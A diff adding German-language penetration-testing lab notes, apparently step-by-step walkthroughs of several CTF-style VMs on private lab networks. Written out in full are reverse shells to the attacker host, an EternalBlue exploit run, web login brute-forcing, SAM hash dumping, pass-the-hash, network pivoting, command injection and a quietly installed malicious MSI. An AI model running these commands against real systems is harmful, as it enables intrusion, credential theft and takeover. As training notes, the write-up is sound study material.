@@ -1,0 +1,289 @@
+Bulldog:
+- scan mit nmap 192.168.1.0/24
+- scan der vulnbox mit nmap 192.168.1.155 -sV 
+- ports 23, 80 und 8080 sind offen
+- eingeben der IP der vulnbox in browser zeigt bild mit der bulldogge
+- gobuster für directories auf server /dev, /robots.txt und /admin
+- source code auf den seiten überprüfen - /dev am ende bei den nutzernamen sind hashes
+- hashes bei einem hashcracker eingeben
+- ersten 5 hashes ohne ergebnis
+- hash 6 ist sha1 mit ergebnis bulldog -nick
+- hash 7 ist auch sha1 mit bulldoglover aufgelöst –sarah 
+- nun auf /admin und mit nick username und bulldog als passwort anmelden
+- dann auf /dev kann man die webshell aufrufen
+- auf pentestmonkey aus dem reverse shell Cheat Sheel wurde ein Command gesucht 
+-bash -i >& /dev/tcp/192.168.1.157/5555 0>&1 mit IP der Angriffsmaschine und 5555 als Port des Listeners
+-man muss aber aufgrund der Befehlseinschränkungen tunneln mit echo ‚bash -i >& /dev/tcp/192.168.1.157/5555 0>&1‘ | bash und erhält dann keinen Fehler
+-nach Browsing durch die Files findet man die ausführbare Datei namens customPermissionApp
+-strings customPermissionApp und man findet ein Passwort, aber  muss es noch bereinigen
+-dann benötigt man ein Terminal, python -c ‚import pty;pty.spawn(„/bin/bash“)‘ gibt aus permission denied
+-su – root nach Eingabe gibt aus Authentication failure
+-sudo /bin/bash mit Eingabe des Passworts SUPERultimatePASSWORDyouCANTget und man erhält Rootzugriff
+
+
+
+
+
+Derpnstink:
+-	Eingabe der IP-Adresse 192.168.1.231 im Browser
+-	Zeigte unter de Pagesource eine Flag
+-	Nmap -n -A -p- 192.168.1.231 zeigte Port 21/tcp, 22/tcp und 80/tcp offen
+-	Ssh root@192.168.1.231 zeigte access denied und eine Figur
+-	Im robots.txt auf der Seite sieht man /php/ und /temporary/
+-	Ruft man diese auf, mit der IP zuvor im Browser, kommt einmal „try harder“ für /temporary/ und für /php/ „Access forbidden“
+-	dirb http://192.168.1.231 gibt aus, dass es sich tatsächlich um eine Wordpress-Seite handelt und unter /weblog findet man Daten zu evtl. interessanten Inhalten, hier ist die Seite enthalten
+-	gibt man http://192.168.1.231/weblog in den Browser ein, erhält man eine neue Domain namens derpnstink.local, aber kann diese noch nicht erreichen
+-	echo ‚192.168.1.231 derpnstink.local‘ >> /etc/hosts – man fügt diese Domain zu den Hosts hinzu, um sie dann zu erreichen
+-	Aufgrund keiner Berechtigung zu /etc/hosts, funktionierte nur echo '192.168.1.231 derpnstink.local' | sudo tee -a /etc/hosts
+-	wpscan –url http://derpnstink.local/weblog -e u zeigte auf, dass ein Nutzer admin heißt
+-	der Scan liefert auf eine Loginseite mit http://derpnstink.local/weblog/wp-login.php
+-	slideshow arbitrary file upload vulnerability
+-	Der Nutzer heißt admin, als Passwort wurde auch zufällig admin probiert und der Login funkionierte 
+-	Es wurde nach dem Exploit gesucht und das File von github genommen, slideshow-gallery exploit 1.4.6: https://github.com/pentestmonkey/php-reverse-shell
+-	Im script wurden die IP auf die der Angriffsmaschine gesetzt sowie Port 5555
+-	Ein listener wurde gesetzt mit sudo nc -nvlp 5555
+-	Im Browser wurde irgendeine nichtexistierende Website aufgerufen nach Anleitung mit exploit-db: http://192.168.1.158/weblog/wp-content/uploads/slideshow-gallery/php-reverse-shell.php
+-	Der Listener zeigte Reaktion daraufhin, wenn man auf der Website von Wordpress etwas macht
+-	Which Python für Pfad
+-	Importieren vom pty-Module: python -c ‚import pty;pty.spawn(„/bin/bash“)‘
+-	Man bekommt als www-data@derpnstink Zugriff
+-	Ls -l /home zeigt zwei Nutzer stinky und mrderp
+-	Für Wordpress navigieren: cd var, cd www, cd html, cd weblog, dann mit cat weblog-config.php ausgeben für die enthaltenen Nutzerdetails für mysql
+-	Mysql -uroot -p, Passwort mysql eingeben und man hat Zugang
+-	Show databases; 
+-	Use wordpress;
+-	Show datatables;
+-	Select * from wp_users; man erhält den User unclestinky und admin, dazu Passwörter gehasht
+-	Passwort von unclestinky cracken, da gesalted
+-	Dann mit dem User www-data switchen auf User stinky mit su – stinky und Passwort wedgie57 eingeben
+-	Im Verzeichnis .ssh findet man einen privaten RSA-Key
+-	Kopieren und anlegen auf der Kali
+-	Chmod 400 id_rsa
+-	Ssh stinky@192.168.1.231 -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa
+-	Cd ftp, cd files, cd network-logs, cat derpissues.txt
+-	Python3 -m http.server
+-	Neuer Tab mit wget http://192.168.1.231 :8000/derpissues.pcap
+-	Wireshark derpissues.pcap
+-	In Wireshark Suche tcp contains „mrderp”
+-	Su – mrderp
+-	Man muss einen Binaries-Ordner erstellen, da sudo su nicht funktioniert
+-	Er kann nur alle Files nur ausführen, die mit derpy starten
+
+VM5: 192.168.1.160
+-	Sudo nmap -sV -O -n -sC 192.168.1.160
+-	135/tcp, 139/tcp, 445/tcp, 3389/tcp, 4152-4157/tcp offen
+-	Suchen nach Microsoft-ds Exploit unter Windows 7 Port 445/tcp offen
+-	Enum4linux -U 192.168.1.160 gab Nutzer wie administrator, guest und krgbt aus
+-	Metasploit nutzen mit msfconsole
+-	Use exploit/windows/smb/ms17_010_eternalblue
+-	Set RHOSTS 192.168.1.160
+-	Set RPORT 445
+-	set payload windows/x64/meterpreter/reverse_tcp
+-	set LHOST 192.168.1.100
+-	run
+-	getuid, getsystem gibt aus, man hat root
+-	man muss aber für die Anrechnung einen Python-Exploit nutzen
+-	Download des Exploits von github: https://github.com/3ndG4me/AutoBlue-MS17-010
+-	Ls -al /usr/share/nmap/scripts | grep smb-  da kein Metasploit, kann es mit nmap erfolgen
+-	Smb-vuln-ms17-010.nse ist der passende Exploit
+-	Sudo nmap -sV -p 445 -O –script=smb-vuln-ms17-010 192.168.1.160
+-	Chmod +x shell_prep.sh im Verzeichnis des Files
+-	./shell_prep.sh
+-	Ip der Kali 192.168.1.157 eingeben, Port 444 für x64 und x86, 1 für cmd
+-	1 für stageless Payload
+-	Listener nc -nvlp 4444
+-	Chmod +x eternalblue_exploit7.py da Windows 7 Ziel
+-	Python eternalblue_exploit7.py 192.168.1.160 shellcode/sc_x64.bin
+-	Im Listener erhält man nun eine Shell
+-	Whoami zeigt, man ist root
+
+
+VM6: 192.168.1.101
+-	scan ergab, dass Port 22/tcp offen ist mit ssh, Windows 7.7 und Protocol Version 2.0
+-	enum4linux -U gibt die Nutzer administrator, krbgt, domain admins, root, bin und guest aus, laut Dokument gibt es aber Tipps, sodass der User Jenny existiert, usw. 
+-	vncviewer 192.168.1.101:5900, man erhält eine GUI in Windows und kann User Jenny z.B. auswählen und braucht dann noch ihr Passwort
+-	mit crackmapexec smb 192.168.1.101 -u jenny -p rockyou.txt
+-	das Passwort wurde herausgefunden und lautet „iloveyou“
+-	Da immer der Windows Defender eigene Skripte verhinderte, wurde dann ein Exploit von github verwendet: https://github.com/itm4n/PrivescCheck
+-	Starten eines Python-Servers python3 -m http.server 80 im Ordner des Downloads für PrivescCheck.ps1
+-	In der cmd powershell -c “iwr http://192.168.1.157:80/PrivescCheck.ps1 -OutFile check.ps1”
+-	Powershell -ep bypass -c “. .\check.ps1; Invoke-PrivescCheck” laut Anleitung auf github
+-	sc config iphlpsvc binPath= "cmd.exe /c net localgroup administratoren jenny /add
+-	Sc stop iphlpsvc 
+-	Überprüfen auf Rechte und man hat root
+-	Für die Firewall VM4 konnten die Zugangsdaten Admin mit Passwort FyDRAquukjS2 gefunden werden
+-	Firewall ist evtl. 192.168.2.102 oder 192.168.2.254
+
+Mrrobot: 192.168.2.69
+-	Da die VM im anderen Subnetz liegt, musste man mit ip route add 192.168.2.69 via 192.168.1.1 eine Verbindung herstellen
+-	192.168.1.1 zeigte im Browser das gleiche Interface, somit ist man davon ausgegangen, dass diese als Gateway dient
+-	IP-Adresse ist im Browser aufrufbar und man erhält eine Webshell mit ein paar Befehlen
+-	Ein Scan mit curl http://192.168.1.69/robots.txt ergab weiterhin 2 Dateien
+-	Wget http://192.168.1.69/fsocitiy.dic sowie wget bei der Datei key-1-of-3.txt
+-	Nikto -h http://192.168.2.69 für Interessante Inhalte, man erhält /admin, /readme, /image
+-	/readme hat nichts Interessantes, /admin leitet zu /admin/index.html, diese Seite versucht, permanent zu aktualisieren
+-	/image gibt ein Bild aus sowie weitere Inhalte zur Website, diese ist in WordPress, weitere Websites sind referenziert
+-	Nikto findet auch weitere Details wie wp-login.php
+-	Auf wp-login.php findet man die Loginseite 
+-	Wpscan gibt keine Nutzer aus
+-	Aussortieren von Duplikaten in der Wörterliste von fsocity.dic mit sort fsocity.dic | uniq > fsocity.txt
+-	Burp Suite starten und Login testen, die POST-Request dann zum Intruder senden, der Nutzername muss mit einem Bruteforceangriff herausgefunden werden
+-	Den Eingegebenen Nutzernamen markieren und Add drücken
+-	Dann fsocity.php unter Payload einfügen und Angriff starten
+-	Sortiert man nach Length in der Burp Suite, erkennt man, dass es für den Nutzernamen Elliot abweicht
+-	hydra -l Elliot -P fsocity.txt 192.168.1.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=ERROR"
+-	man erhält das Passwort ER28-0652 und kann sich auf der Wordpress-Seite anmelden
+-	Unter Appearance und Editor ist das 404 Template, hier lädt man die Reverse Shell von pentestmonkey mit der IP 192.168.1.157 hoch und den Port 4444
+-	Dann nc -nlvp 4444
+-	Dann Eingabe von 192.168.2.69/irgendwas im Browser, etwas, das nicht existiert und man erhält im Listener die Reverse Shell
+-	Ls -lah und man sieht den Ordner root, aber Permission denied
+-	Cd home
+-	Ls -lah und man sieht den Ordner robot 
+-	Cd robot und man sieht mit cat password.raw-md5 das gehashte Passwort
+-	Cracken auf crackstation.net und man erhält als Passwort: abcdefghijklmopqrstuvwxyz
+-	python -c 'import pty; pty.spawn("/bin/bash")'
+-	export TERM=xterm, damit man ein Terminalverhalten erhält und su – robot eingeben kann ohne Fehlermeldung, dann das gecrackte Passwort eingeben
+-	man ist dann als Nutzer robot angemeldet, aber hat noch kein root
+-	Exploit über alte Kernelversion könnte erfolgen, aber einfacherer Weg wird gesucht
+-	Find / -perm -4000 -type f 2>/dev/null
+-	Nmap hat suid-Bit – User robot kann temporär nmap ausführen, obwohl es root gehört
+-	Nmap --interactive
+-	!sh
+-	Cd /root
+-	Cat key-3-of-3.txt
+-	Man hat damit die Flag und root
+Option 2 mit proxychains:
+-	proxychains curl http://192.168.2.69/robots.txt
+-	proxychains wget http://192.168.2.69/fsocity.dic
+-	proxychains wget http://192.168.2.69/key-1-of-3.txt
+-	proxychains nikto -h http://192.168.2.69 dauerte wesentlich länger und fand die Directories nicht
+-	es funktioniert nur: proxychains feroxbuster -u http://192.168.2.69 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 und so konnte beispielsweise wp-login.php gefunden werden
+-	Da Burp Suite nicht mit proxychains funktioniert, wurde der Nutzername mit Bruteforce herausgefunden: proxychains hydra -t 64 -L fsocity.txt -p test 192.168.2.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=ERROR"
+-	Dann Bruteforce für das Passwort: proxychains hydra -l Elliot -P fsocity.txt 192.168.2.69 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:F=ERROR"
+-	In Firefox den Proxy umstellen, dann kann man auf die Loginseite zugreifen mit proxychains firefox http://192.168.2.69/wp-login.php, die Seiten laden aber sehr langsam
+-	Wieder wie zuvor die Reverse Shell hochladen, am besten kopierte man die Shell von revshells.com zuvor
+-	proxychains curl http://192.168.2.69/wp-content/themes/TwentyFifteen/404.php um die Reverse Shell zu triggern
+-	man erhält dann die Reverse Shell und kann analog wie zuvor Root erlangen
+VM 8: 192.168.1.205
+-	Nmap -A -p- -sV 192.168.1.205 gab aus, dass Port 22 und 80 offen sind
+-	Mit curl 192.168.1.205/robots.txt oder im nmap-Scan sieht man einen Pfad namens /S3cr3t/
+-	Curl 192.168.1.205/S3cr3t/ gibt den html-Code aus, nichts Interessantes, aber man kann die Seite auch im Browser aufrufen, diese ist WordPress
+-	Es gibt ein Kommentar, da steht etwas von –plugins-detection aggressive
+-	Es sagt, die Seite hat einen Autor wp_user
+-	Nikto -h http://192.168.1.205/S3cr3t/ gibt aus, es gibt eine Loginseite
+-	Wpscan –url http://192.168.1.205/S3cr3t/ --enumerate u findet Users alpha und wp_user
+-	Wpscan –url http://192.168.1.205/S3cr3t/ --plugin-detection aggressive findet die Plugins akismet und duplicator
+-	Ein Exploit in Python wurde zu duplicator gefunden: https://www.exploit-db.com/exploits/50420
+-	Nach dem Herunterladen wurde der Code geändert mit richtiger URL http://192.168.1.205/S3cr3t
+-	Der 1. Scan nannte auch wieder den User alpha aus python3 duplicator.py http://192.168.1.205/S3cr3t/ /etc/passwd
+-	Nach Recherche wurde probiert und mit python3 duplicator.py http://192.168.1.205/S3cr3t/ /home/alpha/.ssh/id_rsa konnte der rsa-Key ausgegeben werden für alpha
+-	Erstellen des Files id_rsa
+-	Chmod 600 id_rsa
+-	Unter Desktop nach Ausgabe von user.txt konnte eine Flagge oder Ähnliches gefunden werden, als Passwort für alpha stimmt es nicht
+-	Es wurde weitergesucht, unter Documents findet man das file notes.txt, hier ist das Passwort enthalten
+-	Mit sudo su und Eingabe des Passwortes ist man dann root 
+-	Flagge wurde dann in /root gefunden in root.txt
+
+VM11: 192.168.2.221
+-	Nicht erreichbar mit normalen nmap-Befehlen, liegt im anderen Subnetz zusätzlich
+-	Nicht sinnvoller Scan kann aber durchgeführt werden mit dem Flag -Pn
+-	Herausgefunden, dass man die Maschine über VM6 angreifen sollte
+-	wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz sowie anstatt windows einmal den Link mit linux, für die Kali VM
+-	unzippen, dann für VM6 mv chisel.1_windows_amd64 chisel.exe
+-	python3 -m http.server 8000 auf der Kali im Folder von chisel
+-	Invoke-WebRequest http://192.162.1.158:8000/chisel.exe -OutFile chisel.exe
+-	Es gab Probleme mit dem Windows Defender, deshalb nochmal mit Adminrechten für Jenny dann chisel.exe erlaubt und irgendwann nach mehreren Versuchen funktionierte es, irgendwann war die .exe ausführbar auf der VM6
+-	Auf der Windows .\ chisel.exe client 192.168.1.158:9001 R:socks
+-	Kali: ./chisel_1.10.1_linux_amd64 -p 9001 –-reverse im Folder von chisel
+-	Zusätzlich musste ein File erstellt werden: nano /etc/proxychains.conf, hier wurde [ProxyList] eingetragen und darunter socks5 127.0.0.1 1080
+-	Leitet den Traffic über einen SOCKS5-Proxy auf dem lokalen Rechner (127.0.0.1) am Port 1080 weiter. 
+-	proxychains nmap -sT -Pn 192.168.2.221 nun konnten Ports der VM11 gescannt werden, es kam bei offenen immer OK und bei den anderen socket error or timeout
+-	durch die offenen Ports kann nun ein Angriff erfolgen
+-	als offen wurden 445, 139, 135, 3389 angezeigt, auch nach längerem Scan kamen nur noch Fehlermeldungen, keine weiteren offenen Ports in absehbarer Zeit
+-	proxychains nmap -p445 --script smb-protocols 192.168.2.221 wurde herausgefunden, dass nicht Version 1 von smb aktiv ist, somit kein Exploit dadurch im Port 445
+-	mit enum4linux -A 192.168.2.221 konnten wieder die Nutzer administrator, guest, krbgt, domain admins, root, bin, none gefunden werden, aber mit proxychains in Verbindung mit enum4linux funktionierte es nicht
+-	Es wurde ein Bruteforce-Angriff mit den Nutzern und rockyou.txt versucht, aber damit erhielt man nichts 
+-	Cmd: chisel.exe client 192.168.1.158:9001 R:8080:192.168.2.221:80
+-	Ruft man nun im Browser auf http://127.0.0.1:8080, kommt auch nur Connection was reset
+-	Aber Port 80 war auch zuvor nicht offen, das erklärt dies
+-	Port 3389 scheint auch gut abgesichert zu sein:
+-	 CredSSP (Credential Security Support Provider) – wird für sichere Authentifizierung genutzt
+-	NLA (Network Level Authentication) – verlangt, dass man sich schon vor der RDP-Sitzung authentifiziert
+-	Early User Auth – Benutzeranmeldung wird früh geprüft
+-	RDS-TLS – Verschlüsselung der Verbindung via TLS
+-	proxychains nmap -p 445 --script=smb-protocols 192.168.2.221 um die Versionen von smb zu bekommen
+-	dann wurde msfconsole geöffnet
+-	search samba symlink
+-	use 0
+-	show options, man sieht, evtl. Share könnte zugänglich sein
+-	set RHOST 192.168.2.221
+-	set smbshare Share
+-	exploit
+-	wurde beendet, dann proxychains smbclient //192.68.2.221/Share
+-	als Passwort wurde einfach rootfts eingegeben und stimmte zufällig, dann weiter überprüft und irgendwelche Passwörter funktionierten
+-	nun hat man eine smb Shell im Share
+-	in der smb Shell konnte mit get backup-zip heruntergeladen werden
+-	mit fcrackzip -v -D -p /usr/share/wordlists/rockyou.txt backup.zip konnte als Passwort !!!sagitario))) () herausgefunden werden
+-	dann unzip backup.zip mit Passwort !!!sagitario))) funktionierte
+-	man erhält dann ein Paar Bilder sowie 2 Programme
+-	es wird versucht, etwas mit steghide extract -sf PWD.jpeg herauszubekommen, aber dafür wird wieder ein Passwort benötigt
+-	auf dem Bild mit dem Schauspieler steht unten rechts auch der String gamma:gammacanbedangerous!
+-	Auf RDP kann man sich als Nutzer gamma mit dem Passwort gammacanbedangerous! Anmelden, da dieser Port auch offen ist
+-	Man ist dann als Nutzer gamma in der Windows VM mit GUI
+-	Man ist in der Gruppe Remotedesktopnutzer ohne Adminrechte
+-	Mit winpeas könnte eine Privilege Escalation erfolgen
+-	Das rüberziehen von winpeas.exe auf VM6 funktionierte, aber konnte wegen fehlendem Zugriff dann nicht auf VM11 herüberkopiert werden
+-	Wget http://github.com/peass-ng/PEASS-nbg/realeases/latest/download/winPEASany_ofs.exe
+-	Flagge in user.txt wurde auf dem Desktop gefunden
+-	Über RDP xfreerdp /v:192.168.2.221 /u:gamma /p:gammacanbedangerous! /drive:share,/home/kali/backup
+-	copy \\tsclient\share\winpeas.exe C:\Users\Public\winpeas.exe
+-	nun ist im Ordner von gamma endlich winpeas.exe
+-	weiterhin wurde check.ps1 herübergeladen aus der Privilege Escalation von VM6, aber wurde in dieser Windows-Version gepatcht
+-	Da Windows 10 19044 vorhanden ist, konnte herausgefunden werden, dass HiveNightmare ein Exploit ist sowie deutete winpeas dies an, da es Dateien gab im Administrator-Ordner mit all access für gamma
+-	Mit wget HiveNightmare.exe https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe konnte das Script heruntergeladen werden und über RDP wieder auf die Zielmaschine kopiert
+-	.\HiveNightmare.exe in Powershell und man erhät die Dateien System, SAM und Security
+-	Daraufhin wurde secretsdump.py installiert: 
+-	git clone https://github.com/SecureAuthCorp/impacket.git
+-	cd impacket
+-	sudo apt install python3 python3-pip
+-	sudo python3 setup.py install
+-	pip3 install -r requirements.txt
+-	dann im Ordner impacket secretsdump.py -sam /home/kali/backup/SAM -system /home/kali/backup/SYSTEM -security /home/kali/backup/SECURITY LOCAL
+-	proxychains wmiexec.py Administrator@192.168.2.221 -hashes [siehe Bild] konnte als Admin auf die VM geladen werden
+-	im Desktop konnte die Flagge für root ausgegeben werden in der shell
+-	im Nachgang ist aufgefallen, dass es mit ip Route über 192.168.2.0/24 via 192.168.1.1 evtl. einfacher gewesen wäre
+
+VM  16
+-	nmap scan gab offen port 1337 waste
+-	nc -nv 192.168.2.116 1337 ergab schlechte Shell
+-	in Shell whoami gibt User biff
+-	cat notes.txt gibt user marty aus
+-	ls -sail /home/marty/email gibt mail FromDocBrown
+-	cat /home/marty/email/FromDocBrown gibt Base64 der Email
+-	gibt xz-Util Backdoor als Tipp
+-	cat /home/marty/.ssh/authorized_keys gibt privaten ssh von marty
+-	find gab alle Directories aus, auch dann Pfad für cat und ssh key dann
+-	nano marty.txt für den ssh key 
+-	ssh2john marty.txt > martyssh.txt
+-	john –show martyssh.txt gibt passwort funtime
+-	marty.txt mit dem originalen ssh key war der public key
+-	dann mit go xzbot installieren 
+
+VM17
+-	192.168.2.117/dev dann in 192.168.2.117/dev/network wechseln für webshell
+-	In der Webshell funktioniert, dass das 2. Command ausgeführt wird bei oder-Codierung ||, wenn das 1. Nicht funkioniert, wird dass nach || ausgeführt
+-	Mit der Reverse Shell Powershell 2 auf revshells.com und 1.1.1.1 || “Reverse Shell” kann man eine Reverse Shell herstellen
+-	Auf dem Desktop vom User nebula befand sich eine Datei 
+-	copy "C:\Users\nebula\Desktop\forensics_artefacts.zip" "C:\xampp\htdocs\dev\" auf den Webserver hochladen und mit der Kali herunterladen
+-	zip2john forensics_artefacts.zip > artefacts.txt
+-	john –show artefacts.txt gibt Passwort kingfish
+-	7z x forensics_artefacts.zip 
+-	Secretsdump.py -sam sam -system system LOCAL
+-	Man erhält Hashes und kann das Passwort für User thanos cracken webster5840
+-	xfreerdp /u:USERNAME /p:PASSWORD /v:192.168.2.117 und kann als thanos anmelden
+-	iwr http://192.168.2.103:8080/check.ps1 -OutFile C:\Users\Public\check.ps1 über Python Server
+-	powershell -ExecutionPolicy Bypass -File C:\Users\Public\check.ps1
+-	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.103 LPORT=4444 -f msi > evil.msi und vorher Listener auf 4444
+-	iwr http://192.168.2.103:8080/evil.msi -OutFile C:\Users\Public\evil.msi
+-	msiexec /quiet /qn /i C:\Users\Public\evil.msi
+-	dann hat man reverse Shell auf dem Listener
